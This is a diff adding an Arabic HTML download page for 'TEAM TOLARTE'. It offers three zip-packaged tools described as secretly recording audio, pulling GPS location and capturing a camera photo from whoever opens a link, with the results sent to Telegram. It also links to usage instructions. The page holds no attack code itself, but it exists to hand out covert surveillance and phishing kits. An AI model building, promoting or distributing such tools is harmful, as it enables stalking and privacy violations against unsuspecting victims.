@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>TEAM TOLARTE</title>
+  <style>
+    body {
+      font-family: 'Cairo', Tahoma, sans-serif;
+      background: linear-gradient(to right, #1e1e2f, #2c2c3d);
+      color: #f0f0f5;
+      margin: 0;
+      padding: 2rem;
+      max-width: 1200px;
+      margin-left: auto;
+      margin-right: auto;
+      text-align: center;
+    }
+
+    h1 {
+      color: #00c8ff;
+      margin-bottom: 2rem;
+      font-size: 2rem;
+    }
+
+    .tool-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 2rem;
+    }
+
+    .tool-card {
+      background-color: #2a2a3b;
+      border-radius: 10px;
+      padding: 1rem;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      transition: transform 0.3s;
+    }
+
+    .tool-card:hover {
+      transform: scale(1.03);
+    }
+
+    .tool-card img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin-bottom: 1rem;
+    }
+
+    .tool-desc {
+      font-size: 1rem;
+      margin: 0.5rem 0 1rem;
+      color: #cceaff;
+    }
+
+    .download-btn {
+      background-color: #00c8ff;
+      color: #1e1e2f;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .download-btn:hover {
+      background-color: #009ac9;
+      color: white;
+    }
+
+    footer {
+      margin-top: 3rem;
+      font-size: 0.9rem;
+      color: #999;
+    }
+  </style>
+</head>
+<body>
+
+<h1>📥 اختر أداتك</h1>
+
+<div class="tool-grid">
+
+  <div class="tool-card">
+    <img src="../res/img/1.png" alt="أداة 1">
+    <p class="tool-desc">تسجيل الصوت من خلال رابط ويتم ارسال الى تيليفرام</p>
+    <button class="download-btn" onclick="downloadFile('../res/gps.zip')">تحميل الأداة</button>
+  </div>
+
+  <div class="tool-card">
+    <img src="../res/img/2.png" alt="أداة 2">
+    <p class="tool-desc">سحب gps من خلال رابط ويتم ارسال الى تيليقرام</p>
+    <button class="download-btn" onclick="downloadFile('../res/gps.zip')">تحميل الأداة</button>
+  </div>
+
+  <div class="tool-card">
+    <img src="../res/img/3.png" alt="أداة 3">
+    <p class="tool-desc">التقات صورة من خلال رابط ويتم ارسال الى تيليقرام</p>
+    <button class="download-btn" onclick="downloadFile('../res/camera.zip')">تحميل الأداة</button>
+  </div>
+
+  
+</div>
+
+<br><br>
+
+<a href="../proj/explain-ar.html" style="
+            display: inline-block;
+            background-color: #007bff;
+            color: #fff;
+            text-decoration: none;
+            padding: 12px 25px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);">
+            طرقة الاستخدام ...
+        </a>
+
+
+
+
+
+<script>
+function downloadFile(path) {
+  const link = document.createElement("a");
+  link.href = path;
+  link.download = "";
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+}
+</script>
+
+<footer>
+  &copy; 2025 فريق Tolarte. جميع الحقوق محفوظة.
+</footer>
+
+</body>
+</html>
